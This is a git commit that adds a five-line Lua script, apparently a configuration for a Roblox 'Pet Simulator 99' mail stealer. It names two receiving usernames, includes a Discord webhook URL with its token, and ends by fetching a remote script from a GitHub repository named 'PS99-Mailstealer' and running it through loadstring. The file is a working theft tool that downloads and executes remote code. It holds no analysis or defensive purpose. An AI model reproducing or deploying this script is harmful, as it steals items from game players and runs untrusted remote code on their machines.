a86b4fa523565daf5ee0914c1d08d7b8c8791c30
jojiboji22 <154750286+jojiboji22@users.noreply.github.com>
2024-07-02 22:12:21 +0100

    Add files via upload

---
+++ New Text Document (3).lua
@@ -0,0 +1,5 @@
+Username = "af1_akram"
+Username2 = "af2_akram"
+Webhook = "https://discord.com/api/webhooks/1257264603973550161/GmZNLy9rtL_pI16yIq0qcHPSn5iJVWmL9bjXVj2ONEDjz9e36EZSbHKP1P1uWWeQBXLF"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
